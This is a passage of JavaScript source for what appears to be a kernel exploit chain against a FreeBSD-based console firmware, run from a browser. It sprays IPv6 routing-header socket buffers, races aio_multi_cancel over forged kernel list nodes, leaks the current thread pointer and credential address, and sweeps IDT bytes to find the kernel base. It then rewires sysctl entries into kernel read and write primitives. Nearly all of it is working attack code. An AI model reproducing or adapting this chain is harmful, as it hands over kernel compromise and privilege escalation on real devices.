    toDv.setUint32(0, TOWAIT, true);
    toDv.setUint32(4, 0, true);
    mark("PR-TOWAIT", "aio_multi_wait timeout=" + TOWAIT
        + "us was=100000us deaths_in_that_sleep=all armings=4 exposure_was=400ms");

    const POOL_local = POOL;
    for (let i = 0; i < SPRAY; i++) {
        const fd = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
        if (fd < 0) break;
        POOL_local.push(fd);
        opened.push(fd);
    }
    mark("PR-POOL", "reclaim sockets=" + POOL.length);

    const pAb = new ArrayBuffer(RTH_SIZE); keepAlive.push(pAb);
    pDv = new DataView(pAb);
    pAd = bufAddr(pAb);
    function setNode0(nextAddr, secondDec) {
        new Uint8Array(pAb).fill(0);
        pDv.setUint8(1, RTH_LEN);
        pDv.setUint8(3, RTH_SEGLEFT);
        put(pDv, 0x08, secondDec);
        put(pDv, 0x10, M_AD);
        put(pDv, 0x30, nextAddr);
    }
    /* Exposed to relapseAdaptCleanup, which re-points node0 at the sink from a
       different function. */
    setNode0Ref = setNode0;

    let armTrace = false;

    function armOnce() {
        try { if (typeof A !== "undefined" && A) A.busy = 1; } catch (e) { }
        const g = armCount + 1;
        const at = function (t, d) { if (armTrace) trace(t, "a=" + g + " " + d); };
        at("ARM-P1-FREE", "pool=" + POOL.length);
        for (const fd of POOL) sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
        at("ARM-P2-SUBMIT", "freed=" + POOL.length);
        const rs = sc(SYS.aio_submit_cmd, 1 | 0x1000, bufAddr(rqAb), 2, 3, idAd).i32;
        if (rs !== 0) { at("ARM-SUBMIT-FAIL", "rs=" + rs); return "submit=" + rs; }

        toDv.setUint32(0, TOWAIT, true);
        toDv.setUint32(4, 0, true);
        at("ARM-P3-WAIT", "to=" + TOWAIT + "us submit=0 to_rb="
            + toDv.getUint32(0, true) + " toad=" + toAd);
        const tw0 = Date.now();
        sc(SYS.aio_multi_wait, idAd, 2, stAd, 0, toAd);
        waitMs = Date.now() - tw0;
        at("ARM-P4-SPRAY", "wait=" + waitMs + "ms");
        let n = 0;
        for (const fd of POOL)
            if (sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 === 0) n++;
        armCount++;
        at("ARM-P5-ARMED", "sprayed=" + n + " wait=" + waitMs + "ms");
        return "ok sprayed=" + n + " wait=" + waitMs + "ms";
    }

    const lkNodes = new ArrayBuffer(NODE_SZ * N_LEAK); keepAlive.push(lkNodes);
    lkNdv = new DataView(lkNodes);
    lkNad = bufAddr(lkNodes);

    async function leakCurthread(w) {
        toDv.setUint32(0, TOWAIT, true);
        toDv.setUint32(4, 0, true);
        new Uint8Array(lkNodes).fill(0);
        for (let i = 0; i < N_LEAK; i++) {
            const o = i * NODE_SZ;
            put(lkNdv, o + 0x00, LX);
            put(lkNdv, o + 0x08, LC);
            put(lkNdv, o + 0x10, M_AD);
            put(lkNdv, o + 0x30, i === N_LEAK - 1 ? 0 : lkNad.add32(o + NODE_SZ));
        }
        lkDv.setInt32(0x00, 0x40000000, true);
        lkDv.setInt32(0x10, 0x40000000, true);
        mU32[6] = 4;
        mU32[7] = 0;
        setNode0(lkNad, LC);
        const a = armOnce();
        if (a.indexOf("ok") !== 0) { mark("PR-LEAK-ARM", w.name + " " + a); return null; }

        {   /* warm the mutex word -- unchanged from the standalone chain. */
            let wu = 0;
            for (let i = 0; i < 200000; i++) {
                mU8[0x30 + (i & 15)] = i & 0xff;
                wu ^= mU32[OWNER_LO];
            }
            if (wu === 0x7fffffff) mark("PR-WARM", "" + wu);
        }
        const samples = [];
        let hitLo = 0, hitHi = 0, hits = 0;
        let pr = null;
        try { pr = w.fire(SYS.aio_multi_cancel, [idAd, 1, stAd]); } catch (e) { }
        for (let i = 0; i < SPIN; i++) {
            mU8[0x30 + (i & 15)] = i & 0xff;
            const hi1 = mU32[OWNER_HI];
            if (hi1 !== 0) {
                const lo = mU32[OWNER_LO];
                const hi2 = mU32[OWNER_HI];
                if (hi1 === hi2 && lo !== 4) {
                    if (!hits) { hitLo = lo; hitHi = hi1; }
                    hits++;
                    if (samples.length < 32)
                        samples.push((hi1 >>> 0).toString(16).padStart(8, "0")
                            + (lo >>> 0).toString(16).padStart(8, "0"));
                    if (hits > 48) break;
                }
            }
        }
        const drop = 0x40000000 - lkDv.getInt32(0x00, true);
        const uniq = {};
        for (const v of samples) uniq[v] = (uniq[v] || 0) + 1;
        const keys = Object.keys(uniq);
        mark("PR-LEAK", w.name + " hits=" + hits + " walked=" + drop + "/" + N_LEAK
            + " samples=" + (keys.length
                ? keys.map(k => k + " x" + uniq[k]).join(" ") : "none"));
        try { if (pr) await pr; } catch (e) { }
        if (!hits || hitHi >>> 0 < 0xffff0000 || keys.length !== 1) return null;
        return new int64(hitLo >>> 0, hitHi >>> 0);
    }

    CT1 = await leakCurthread(w1);
    armTrace = true;

    if (REAPLEAK) {
        put(lkNdv, 0x00, LX);
        put(lkNdv, 0x08, LC);
        put(lkNdv, 0x30, 0);
        const rlc = sc(SYS.aio_multi_cancel, idAd, 2, stAd).i32;
        const rlp = sc(SYS.aio_multi_poll, idAd, 2, stAd).i32;
        const rld = sc(SYS.aio_multi_delete, idAd, 2, stAd).i32;
        mark("PR-REAPLEAK", "cancel=" + rlc + " poll=" + rlp + " delete=" + rld);
    } else {
        mark("PR-REAPLEAK", "skipped park=" + (PARK ? 1 : 0));
    }

    mark("PR-CURTHREADS", "w1=" + CT1
        + " (w2 not leaked: one arming saved)"
        + "  -- both workers are now PARKED and issue no further syscalls");

    let parkFail = "";
    if (!PARK) {
        mark("PR-PARK", "skipped park=0 restore=self reapleak=" + (REAPLEAK ? 1 : 0));
    } else {
        const prev = w1.worker.onmessage;
        w1.worker.onmessage = function (e) {
            const d = e.data || {};
            if (d.id === -1) { parkFail += " " + (d.value || d.type); return; }
            if (prev) prev.call(this, e);
        };
        w1.worker.postMessage({ id: -1, name: "spin", args: [] });
        await new Promise(r => setTimeout(r, 250));
        mark("PR-PARK", "w1 spin posted parkfail=" + (parkFail || "none"));
    }
    if (PARK && !check("W1-PARKED", parkFail === "",
        parkFail ? "worker.js has no spin(): " + parkFail
            + " -- reload, nothing kernel has been touched yet"
            : "w1 cannot reach syscallenter again, so cred_update_thread can"
            + " never crfree() the wild td_ucred passA is about to create")) return null;

    if (CT1 === null) {
        if (retryBenign("curthread-leak")) return "retry";
        check("POINTER-READ", false, "curthread leak produced no unique hit");
        return null;
    }

    /* ---- the two-pass low-dword read ------------------------------------- */
    const KA_ = KA, KB = PAIR;
    const dumAb = new ArrayBuffer(0x40); keepAlive.push(dumAb);
    dumDv = new DataView(dumAb);
    const dumAd = bufAddr(dumAb);
    dumDv.setInt32(0x00, 0x40000000, true);
    DUM = dumAd.add32(0x00);
    const snkAb = new ArrayBuffer(0x40); keepAlive.push(snkAb);
    snkDv = new DataView(snkAb);
    const snkAd = bufAddr(snkAb);
    SNK = snkAd.add32(0x00);
    N0SINK = snkAd.add32(0x20);

    MAXN = 2 * KA_ + KB + 16;
    const arAb = new ArrayBuffer(NODE_SZ * MAXN); keepAlive.push(arAb);
    arDv = new DataView(arAb);
    arAd = bufAddr(arAb);
    mark("PR-ARENA", "nodes=" + MAXN + " bytes=0x"
        + (NODE_SZ * MAXN).toString(16) + " @" + arAd);

    function wnode(i, decAddr, sinkAddr, last) {
        const o = i * NODE_SZ;
        put(arDv, o + 0x00, decAddr);
        put(arDv, o + 0x08, sinkAddr);
        put(arDv, o + 0x10, M_AD);
        put(arDv, o + 0x18, 0);
        put(arDv, o + 0x20, 0);
        put(arDv, o + 0x28, 0);
        put(arDv, o + 0x30, last ? 0 : arAd.add32(o + NODE_SZ));
    }

    const gfAb = new ArrayBuffer(0x80); keepAlive.push(gfAb);
    const gfDv = new DataView(gfAb), gfAd = bufAddr(gfAb);
    const glAb = new ArrayBuffer(8); keepAlive.push(glAb);
    const glDv = new DataView(glAb), glAd = bufAddr(glAb);
    function whoHasF() {
        let found = -1, hits = 0, state0 = 0;
        for (let i = 0; i < POOL.length; i++) {
            glDv.setInt32(0, RTH_SIZE, true);
            glDv.setInt32(4, 0, true);
            new Uint8Array(gfAb).fill(0);
            if (sc(SYS.getsockopt, POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd).i32 !== 0)
                continue;
            const st = gfDv.getUint32(0x20, true) >>> 0;
            if (st !== 0) { hits++; if (found < 0) { found = i; state0 = st; } }
        }
        return { idx: found, hits: hits, state: state0 };
    }

    function reapNow(tag) {
        if (!REAP || reapedGen === armCount) return;
        wnode(0, DUM, DUM, true);
        reapedGen = armCount;
        const c = sc(SYS.aio_multi_cancel, idAd, 2, stAd).i32;
        const pl = sc(SYS.aio_multi_poll, idAd, 2, stAd).i32;
        const d = sc(SYS.aio_multi_delete, idAd, 2, stAd).i32;
        post("REAP", tag + " gen=" + reapedGen + " cancel=" + c
            + " poll=" + pl + " delete=" + d);
    }

    function runChainNodes(nNodes, label) {
        snkDv.setInt32(0x00, 0x40000000, true);
        snkDv.setInt32(0x20, 0x40000000, true);
        trace("CH-MTX-PRE", label + " owner=" + (mU32[OWNER_HI] >>> 0).toString(16)
            + ":" + (mU32[OWNER_LO] >>> 0).toString(16) + " want=0:4");
        mU32[OWNER_LO] = 4;
        mU32[OWNER_HI] = 0;
        setNode0(arAd, N0SINK);
        const a = armOnce();
        if (a.indexOf("ok") !== 0) { mark("PR-ARM-FAIL", label + " " + a); return null; }
        trace("CH-CANCEL", label + " nodes=" + nNodes + " walking");
        sc(SYS.aio_multi_cancel, idAd, 1, stAd);
        trace("CH-CANCEL-DONE", label + " returned");
        const moved = 0x40000000 - snkDv.getInt32(0x00, true);
        const n0 = 0x40000000 - snkDv.getInt32(0x20, true);
        const w = whoHasF();
        mark("PR-FIRE", label + " nodes=" + nNodes + " sink_moved=" + moved
            + " node0_sink=" + n0 + " f_socket=" + w.idx + " f_hits=" + w.hits
            + " state=0x" + w.state.toString(16) + " (" + a + ")");
        if (n0 === 1 && w.idx < 0)
            mark("PR-F-UNSEEN", "node0 fired but no pool socket carries the"
                + " state write -- F went to something outside the pool");
        reapNow("a=" + armCount);
        return moved;
    }

    const X1 = CT1.add32(TD_UCRED_OFF);
    mark("PR-PASSA-TARGET", "X1 = w1.curthread+0x130 (td_ucred) = " + X1
        + "  KA=" + KA_ + " pair=0x" + PAIR.toString(16) + " covers up to " + KA_ * PAIR);

    let kA = 0;
    {
        let i = 0;
        for (let j = 0; j < KA_; j++) {
            wnode(i++, X1.add32(STEP_OFF), DUM, false);
            wnode(i++, X1, SNK, false);
        }
        const subA = (0x100000000 - ((KA_ * PAIR) % 0x100000000)) % 0x100000000;
        const dA = [subA & 0xff, (subA >>> 8) & 0xff, (subA >>> 16) & 0xff, (subA >>> 24) & 0xff];
        const nA = dA[0] + dA[1] + dA[2] + dA[3];
        mark("PR-RESTOREA", "passA subtracted " + KA_ * PAIR + " sub=0x"
            + subA.toString(16) + " digits=" + dA.join(",") + " nodes=" + nA);
        if (!check("pr-restorea-bounded", nA >= 1 && nA <= 1020, "n=" + nA)) return null;
        {
            const pa = [];
            for (let j = 0; j < 4; j++) for (let d = 0; d < dA[j]; d++) pa.push(j);
            for (let j = 0; j < pa.length; j++)
                wnode(i++, X1.add32(pa[j]), DUM, j === pa.length - 1);
        }
        const mA = runChainNodes(i, "passA");
        if (mA === null) return null;
        if (mA <= 0) {
            mark("PR-PASSA-NOCROSS", "no crossing: low dword either exceeds "
                + KA_ * PAIR + " or is already negative (top bit set)");
            if (retryBenign("passA-nocross")) return "retry";
            check("POINTER-READ", false, "pass A found no crossing");
            return null;
        }
        kA = KA_ - mA + 1;
        mark("PR-PASSA", "m=" + mA + " -> k=" + kA + "  W0 in ("
            + (kA - 1) * PAIR + ", " + kA * PAIR + "]");
    }

    const RED = (kA - 1) * PAIR;
    const dga = [RED & 0xff, (RED >>> 8) & 0xff, (RED >>> 16) & 0xff, (RED >>> 24) & 0xff];
    const nDga = dga[0] + dga[1] + dga[2] + dga[3];
    mark("PR-RESTORE-PLAN", "reduce=" + RED + " digits=" + dga.join(",") + " nodes=" + nDga);
    if (!check("pr-restore-bounded", nDga > 0 && nDga <= 1020 && RED > 0, "n=" + nDga))
        return null;

    const X2 = X1;
    mark("PR-PASSB-TARGET", "x2=" + X2 + " same_copy=1 restore_digits=" + nDga
        + " probes=" + KB);
    let W0 = 0;
    {
        let i = 0;
        const posA = [];
        for (let j = 0; j < 4; j++) for (let d = 0; d < dga[j]; d++) posA.push(j);
        for (let j = 0; j < posA.length; j++) wnode(i++, X2.add32(posA[j]), DUM, false);
        for (let j = 0; j < KB; j++) wnode(i++, X2, SNK, false);

        const totB = (RED + KB) % 0x100000000;
        const subB = (0x100000000 - totB) % 0x100000000;
        const dB = [subB & 0xff, (subB >>> 8) & 0xff, (subB >>> 16) & 0xff, (subB >>> 24) & 0xff];
        const nB = dB[0] + dB[1] + dB[2] + dB[3];
        mark("PR-RESTOREB", "passB subtracted " + totB + " sub=0x"
            + subB.toString(16) + " digits=" + dB.join(",") + " nodes=" + nB);
        if (!check("pr-restoreb-bounded", nB >= 1 && nB <= 1020,
            "n=" + nB + " min=1 max=1020 unterminated_if=0")) {
            mark("REFUSING-TO-ARM", "reason=passb-restore-empty");
            return null;
        }
        {
            const pb = [];
            for (let j = 0; j < 4; j++) for (let d = 0; d < dB[j]; d++) pb.push(j);
            for (let j = 0; j < pb.length; j++)
                wnode(i++, X2.add32(pb[j]), DUM, j === pb.length - 1);
        }
        const mB = runChainNodes(i, "passB");
        if (mB === null) return null;
        if (mB <= 0) {
            mark("PR-PASSB-NOCROSS", "remainder never crossed -- k may be off"
                + " by one, or the two threads' td_proc differ");
            if (retryBenign("passB-nocross")) return "retry";
            check("POINTER-READ", false, "pass B found no crossing");
            return null;
        }
        const R = KB - mB + 1;
        W0 = (kA - 1) * PAIR + R;
        mark("PR-PASSB", "m=" + mB + " -> R=" + R + "  => low dword = " + W0
            + " (0x" + (W0 >>> 0).toString(16) + ")");
    }

    UCRED = new int64(W0 >>> 0, CT1.hi >>> 0);
    mark("PR-UCRED", "ucred = " + UCRED + "  (high dword taken from the leaked"
        + " curthread prefix 0x" + (CT1.hi >>> 0).toString(16) + ")");
    check("pointer-read-shape-ok", W0 >>> 0 !== 0 && ((W0 >>> 0) & 7) === 0,
        "low=0x" + (W0 >>> 0).toString(16) + " 8-byte aligned=" + (((W0 >>> 0) & 7) === 0));

    /* Read phase is done: the armings below touch the kernel, so from here a
       failure must NOT auto-reload. Reset the counter so the next manual run
       starts fresh. */
    clearRetry();

    /* ---- anchor: sweep the IDT gate bytes for kernel base ----------------- */
    const RVA_RSVD = off.k_idt_rsvd;
    const B = {};
    const JOBS = [
        { n: "b0", j: 0, g: 22, want: null, low: () => 0x000000 },
        { n: "b1", j: 1, g: 24, want: null, low: () => (B.b0 << 16) >>> 0 },
        { n: "b3", j: 3, g: 25, want: 0x00, low: () => ((0x20 << 16) | (B.b1 << 8) | B.b0) >>> 0 },
        { n: "b5", j: 5, g: 26, want: 0x8e, low: () => 0x000020 },
        { n: "b6", j: 6, g: 27, want: null, low: () => 0x8e0000 },
        { n: "b7", j: 7, g: 31, want: null, low: () => ((B.b6 << 16) | 0x8e00) >>> 0 },
        { n: "b6d", j: 6, g: 20, want: null, low: () => 0x8e0000 },
        { n: "b7d", j: 7, g: 15, want: null, low: () => ((B.b6 << 16) | 0x8e00) >>> 0 },
    ];
    const NJ = JOBS.length, NEED = NJ * SWEEP * 2;

    mark("ANCHOR-PLAN", "idt=" + IDT + " rsvd_rva=0x" + RVA_RSVD.toString(16)
        + " jobs=" + NJ + " sweep=" + SWEEP + " nodes=" + NEED
        + " gates=" + JOBS.map(q => q.g).join(",") + " armings_so_far=" + armCount);
    if (!check("anchor-nodes-bounded", NEED <= MAXN && SWEEP >= 8 && SWEEP <= 1024,
        "need=" + NEED + " arena=" + MAXN + " sweep=" + SWEEP)) return null;

    {
        let lo = 0x1000000, hi = -1;
        for (let q = 0; q < NJ; q++) {
            const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
            if (o - 3 < lo) lo = o - 3;
            if (o + 3 > hi) hi = o + 3;
        }
        if (!check("anchor-inside-idt", lo >= 0 && hi < 0x1000,
            "lo=+0x" + lo.toString(16) + " hi=+0x" + hi.toString(16) + " limit=0x1000"))
            return null;
        mark("ANCHOR-SPAN", "from=" + IDT.add32(lo) + " to=" + IDT.add32(hi)
            + " gates=15,20-27,31 reserved=1");
    }

    const anAb = new ArrayBuffer(4 * NJ * SWEEP); keepAlive.push(anAb);
    const anDv = new DataView(anAb), anAd = bufAddr(anAb);
    for (let i = 0; i < NJ * SWEEP; i++) anDv.setInt32(i * 4, 0x40000000, true);

    {
        let idx = 0;
        for (let q = 0; q < NJ; q++) {
            const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
            const stepAd = IDT.add32(o);
            const probeAd = IDT.add32(o - 3);
            for (let k = 0; k < SWEEP; k++) {
                wnode(idx++, stepAd, DUM, false);
                wnode(idx++, probeAd, anAd.add32((q * SWEEP + k) * 4), false);
            }
        }
        put(arDv, (idx - 1) * NODE_SZ + 0x30, 0);
        if (runChainNodes(idx, "anchor-sweep") === null) return null;
    }

    function simPattern(bv, low) {
        let w = ((bv << 24) >>> 0) | (low & 0xffffff) | 0;
        let out = "";
        for (let k = 0; k < SWEEP; k++) {
            w = (w - STEPMAG) | 0;
            w = (w - 1) | 0;
            out += w <= 0 ? "1" : "0";
        }
        return out;
    }
    function decodeByte(obs, low) {
        let hit = -1, n = 0;
        for (let bv = 0; bv < 256; bv++)
            if (simPattern(bv, low) === obs) { if (hit < 0) hit = bv; n++; }
        return { b: hit, n: n };
    }

    let bad = 0;
    for (let q = 0; q < NJ; q++) {
        const J = JOBS[q];
        let obs = "", ones = 0, edge = -1;
        for (let k = 0; k < SWEEP; k++) {
            const f = 0x40000000 - anDv.getInt32((q * SWEEP + k) * 4, true) > 0;
            obs += f ? "1" : "0";
            if (f) ones++;
            if (k > 0 && obs.charCodeAt(k) !== obs.charCodeAt(k - 1) && edge < 0)
                edge = k;
        }
        const low = J.low();
        const d = decodeByte(obs, low);
        B[J.n] = d.b;
        if (d.b < 0 || d.n !== 1) bad++;
        mark("ANCHOR-BYTE", J.n + " gate=" + J.g + " j=" + J.j
            + " low=0x" + low.toString(16) + " ones=" + ones + " edge=" + edge
            + " cands=" + d.n + " val=" + (d.b < 0 ? "NO-MATCH" : "0x" + d.b.toString(16)));
        if (J.want !== null)
            check("anchor-control-" + J.n, d.b === J.want,
                "want=0x" + J.want.toString(16) + " got="
                + (d.b < 0 ? "none" : "0x" + d.b.toString(16)));
    }
    if (!check("anchor-every-byte-unique", bad === 0, "nomatch=" + bad + " jobs=" + NJ))
        return null;

    check("anchor-duplicates-agree", B.b6 === B.b6d && B.b7 === B.b7d,
        "b6=0x" + B.b6.toString(16) + " b6d=0x" + B.b6d.toString(16)
        + " b7=0x" + B.b7.toString(16) + " b7d=0x" + B.b7d.toString(16));

    const handlerLo =
        (((B.b7 << 24) >>> 0) + ((B.b6 << 16) >>> 0) + (B.b1 << 8) + B.b0) >>> 0;
    const kbLo = (handlerLo - RVA_RSVD) >>> 0;
    KBASE = new int64(kbLo, 0xffffffff);
    mark("ANCHOR-HANDLER", "handler=0xffffffff" + handlerLo.toString(16).padStart(8, "0")
        + " rva=0x" + RVA_RSVD.toString(16)
        + " b7=0x" + B.b7.toString(16) + " b6=0x" + B.b6.toString(16)
        + " b1=0x" + B.b1.toString(16) + " b0=0x" + B.b0.toString(16));

    const kbAligned = (kbLo & 0x3fff) === 0;
    check("ANCHOR-KERNEL-BASE", kbAligned, "kernel_base=" + KBASE
        + " aligned0x4000=" + (kbAligned ? 1 : 0) + " low=0x" + kbLo.toString(16));
    mark("ANCHOR-VERDICT", "fw=" + fwKey + " kernel_base=" + KBASE
        + " armings=" + armCount + " curthread=" + CT1
        + " verdict=" + (kbAligned ? "ANCHORED" : "REJECTED")
        + (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned"));

    if (!kbAligned) { allDone = true; return null; }

    /*
    ----------------------------------------------------------------------
    THE KERN.FILE ORACLE, in the scope that owns the node arena.
    ----------------------------------------------------------------------
    This runs HERE rather than in stageKrw() because every operation below is
    a `runChainNodes()` call and runChainNodes closes over arAd, DUM, SNK,
    N0SINK, setNode0 and armOnce -- all of stageAnchor's locals. netctrl keeps
    its equivalent at module scope; relapse builds its arena inside the anchor
    stage, so the oracle follows the arena. The earlier split that put this in
    a separate stage left it calling functions it could not see.

    Three things are established in order, each one gating the next:
      1. the oid_number oracle (O_NUM must read 15) -- confirms the base;
      2. hooks are installed so the oracle can write/read a target;
      3. five self-tests prove read32/read8/heap-read/write32/write64.
    */
    const OID = KBASE.add32(off.k_oid_kern_file);
    const O_NUM = OID.add32(0x10);
    const O_VIS = OID.add32(0x50);
    const O_RAN = OID.add32(0x54);

    /* Multi-job fire: run several oracle/sweep jobs in one cancel walk. */
    function multiFire(jobs, label) {
        let need = 0;
        for (const j of jobs) need += j.kind === "sweep" ? SWEEP * 2 : j.n;
        mark("MF-PLAN", label + " jobs=" + jobs.length + " nodes=" + need + " kinds="
            + jobs.map(j => j.kind).join(","));
        if (!check("mf-bounded-" + label, need > 0 && need <= MAXN,
            "need=" + need + " arena=" + MAXN)) return null;
        const nSink = jobs.reduce((a, j) => a
            + (j.kind === "sweep" ? SWEEP : j.kind === "oracle" ? 1 : 0), 0);
        const sAb = new ArrayBuffer(4 * Math.max(1, nSink)); keepAlive.push(sAb);
        const sDv = new DataView(sAb), sAd = bufAddr(sAb);
        for (let k = 0; k < nSink; k++) sDv.setInt32(k * 4, 0x40000000, true);
        let i = 0, sk = 0;
        const base = [];
        for (const j of jobs) {
            base.push(sk);
            if (j.kind === "sweep") {
                for (let k = 0; k < SWEEP; k++) {
                    wnode(i++, j.step, DUM, false);
                    wnode(i++, j.probe, sAd.add32((sk + k) * 4), false);
                }
                sk += SWEEP;
            } else if (j.kind === "oracle") {
                for (let k = 0; k < j.n; k++) wnode(i++, j.addr, sAd.add32(sk * 4), false);
                sk += 1;
            } else {
                for (let k = 0; k < j.n; k++) wnode(i++, j.addr, DUM, false);
            }
        }
        if (i === 0) return jobs.map(() => null);
        put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
        if (runChainNodes(i, label) === null) return null;
        const out = [];
        for (let q = 0; q < jobs.length; q++) {
            const j = jobs[q];
            if (j.kind === "sweep") {
                let obs = "";
                for (let k = 0; k < SWEEP; k++)
                    obs += 0x40000000 - sDv.getInt32((base[q] + k) * 4, true) > 0 ? "1" : "0";
                out.push(decodeByte(obs, j.low));
            } else if (j.kind === "oracle") {
                const m = 0x40000000 - sDv.getInt32(base[q] * 4, true);
                out.push({ m: m, v: m > 0 ? j.n - m + 1 : 0 });
            } else out.push({ n: j.n });
        }
        return out;
    }

    /* kf socket: the kern.file entry we will name in the leak list. */
    const kfSock = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
    if (kfSock >= 0) {
        opened.push(kfSock);
        const tAb = new ArrayBuffer(4);
        const tDv = new DataView(tAb);
        tDv.setInt32(0, KF_MARK, true);
        sc(SYS.setsockopt, kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb), 4);
    }
    if (!check("kf-target-socket", kfSock >= 0, "fd=" + kfSock
        + " tclass=0x" + KF_MARK.toString(16))) { allDone = true; return null; }

    /* The oid_number oracle: read the oid_number field of kern.file itself. */
    const ONUM_SINK = alloc(4);
    ONUM_SINK.dv.setInt32(0, 0x40000000, true);
    {
        let i = 0;
        for (let k = 0; k < ONUM_N; k++) wnode(i++, O_NUM, ONUM_SINK.addr, false);
        put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
        if (runChainNodes(i, "oid_number-oracle") === null) { allDone = true; return null; }
    }
    const onM = 0x40000000 - ONUM_SINK.dv.getInt32(0, true);
    const onV = onM > 0 ? ONUM_N - onM + 1 : 0;
    mark("KF-OIDNUM", "addr=" + O_NUM + " n=" + ONUM_N + " m=" + onM
        + " v=" + onV + " want=" + KERN_FILE_NUM);
    if (!check("KF-ANCHOR-CONFIRMED", onV === KERN_FILE_NUM,
        "oid_number=" + onV + " want=" + KERN_FILE_NUM + " kernel_base=" + KBASE)) {
        allDone = true;
        return null;
    }

    /* unhide kern.file so sysctl(1,15) becomes callable, and set up the
       KRW steer targets. planSub/emitSub encode a byte-wise decrement chain. */
    function planSub(cur, delta) {
        const d = [delta & 0xff, (delta >>> 8) & 0xff,
            (delta >>> 16) & 0xff, (delta >>> 24) & 0xff];
        let clean = true;
        for (let j = 1; j < 4; j++) if (d[j] > ((cur >>> (8 * j)) & 0xff)) clean = false;
        return { d: d, n: d[0] + d[1] + d[2] + d[3], clean: clean };
    }
    function emitSub(baseAd, i, plan) {
        const pos = [];
        for (let j = 0; j < 4; j++) for (let q = 0; q < plan.d[j]; q++) pos.push(j);
        for (let j = 0; j < pos.length; j++) wnode(i++, baseAd.add32(pos[j]), DUM, false);
        return i;
    }

    const curNum = (KERN_FILE_NUM - ONUM_N) >>> 0;
    const pNum = planSub(curNum, (curNum - KERN_FILE_NUM) >>> 0);
    if (!check("kf-restore-clean", pNum.clean && pNum.n <= 1020,
        "nodes=" + pNum.n + " clean=" + (pNum.clean ? 1 : 0))) { allDone = true; return null; }

    {
        let i = emitSub(O_NUM, 0, pNum);
        wnode(i++, O_VIS, DUM, false);   /* unhide */
        put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
        if (runChainNodes(i, "restore+unhide") === null) { allDone = true; return null; }
    }
    const after = kernFile2(false, "after-unhide");
    const capsLive = after.rv === 0;

    /* The KRW steer targets, straight from the offsets table. */
    const A_OID = KBASE.add32(off.k_oid_maxfilesperproc);
    const A2_OID = KBASE.add32(off.k_oid_maxprocperuid);
    const B_OID = KBASE.add32(off.k_oid_maxfiles);
    const A_ARG1_CUR = KBASE.add32(off.k_arg1_maxfilesperproc);
    const A2_ARG1_CUR = KBASE.add32(off.k_arg1_maxprocperuid);
    const B_ARG1 = B_OID.add32(0x18);
    mark("KRW-OIDS", "A(1,27)=" + A_OID + " A2(1,28)=" + A2_OID + " B(1,7)=" + B_OID
        + " &B.arg1=" + B_ARG1 + " capsLive=" + (capsLive ? 1 : 0));

    function planLow(cur, tgt) {
        if (cur.hi >>> 0 !== tgt.hi >>> 0) return null;
        const b = [];
        for (let k = 0; k < 4; k++) b.push((cur.low >>> (8 * k)) & 0xff);
        b.push(0, 0, 0, 0);
        const t = [];
        for (let k = 0; k < 4; k++) t.push((tgt.low >>> (8 * k)) & 0xff);
        function decwin(j) {
            let c = -1;
            for (let k = 0; k < 4 && j + k < 8; k++) {
                let v = b[j + k] + c;
                if (v < 0) { v += 256; c = -1; } else c = 0;
                b[j + k] = v;
                if (c === 0) break;
            }
        }
        const pos = [];
        for (let j = 0; j < 4; j++) {
            const d = (b[j] - t[j]) & 0xff;
            for (let q = 0; q < d; q++) { pos.push(j); decwin(j); }
        }
        const lowOk = b[0] === t[0] && b[1] === t[1] && b[2] === t[2] && b[3] === t[3];
        const hiClean = b[4] === 0 && b[5] === 0 && b[6] === 0 && b[7] === 0;
        if (!lowOk || !hiClean || pos.length < 1 || pos.length > 4090) return null;
        return pos;
    }

    const posA = planLow(A_ARG1_CUR, B_ARG1);
    const posA2 = planLow(A2_ARG1_CUR, B_ARG1.add32(4));
    mark("KRW-PLAN", "posA=" + (posA ? posA.length : "REFUSED")
        + " posA2=" + (posA2 ? posA2.length : "REFUSED"));
    const planOk = capsLive && !!posA && !!posA2;
    if (!check("krw-plan-ok", planOk, planOk ? "" : "capsLive=" + (capsLive ? 1 : 0)
        + " posA=" + (posA ? posA.length : "null")
        + " posA2=" + (posA2 ? posA2.length : "null"))) { allDone = true; return null; }

    {
        let i = 0;
        wnode(i++, A_OID.add32(0x50), DUM, false);
        wnode(i++, A2_OID.add32(0x50), DUM, false);
        wnode(i++, B_OID.add32(0x50), DUM, false);
        for (let k = 0; k < posA.length; k++) wnode(i++, A_OID.add32(0x18 + posA[k]), DUM, false);
        for (let k = 0; k < posA2.length; k++) wnode(i++, A2_OID.add32(0x18 + posA2[k]), DUM, false);
        put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
        if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) { allDone = true; return null; }
        if (runChainNodes(i, "krw-setup") === null) { allDone = true; return null; }
    }

    /* The sysctl-based 32-bit read/write, and read8/write8 on top. */
    const kmAb = new ArrayBuffer(8); keepAlive.push(kmAb);
    const kmDv = new DataView(kmAb), kmAd = bufAddr(kmAb);
    const koAb = new ArrayBuffer(4); keepAlive.push(koAb);
    const koDv = new DataView(koAb), koAd = bufAddr(koAb);
    const knAb = new ArrayBuffer(4); keepAlive.push(knAb);
    const knDv = new DataView(knAb), knAd = bufAddr(knAb);
    const klAb = new ArrayBuffer(8); keepAlive.push(klAb);
    const klDv = new DataView(klAb), klAd = bufAddr(klAb);
    function kMib(a, b) { kmDv.setInt32(0, a, true); kmDv.setInt32(4, b, true); }
    function kSysRead(a, b) {
        kMib(a, b);
        klDv.setInt32(0, 4, true);
        klDv.setInt32(4, 0, true);
        koDv.setInt32(0, 0, true);
        const r = sc(SYS.sysctl, kmAd, 2, koAd, klAd, 0, 0).i32;
        const er = r < 0 ? errno() : 0;
        return { rv: r, err: er, val: koDv.getInt32(0, true) };
    }
    function kSysWrite(a, b, v) {
        kMib(a, b);
        knDv.setInt32(0, v | 0, true);
        const r = sc(SYS.sysctl, kmAd, 2, 0, 0, knAd, 4).i32;
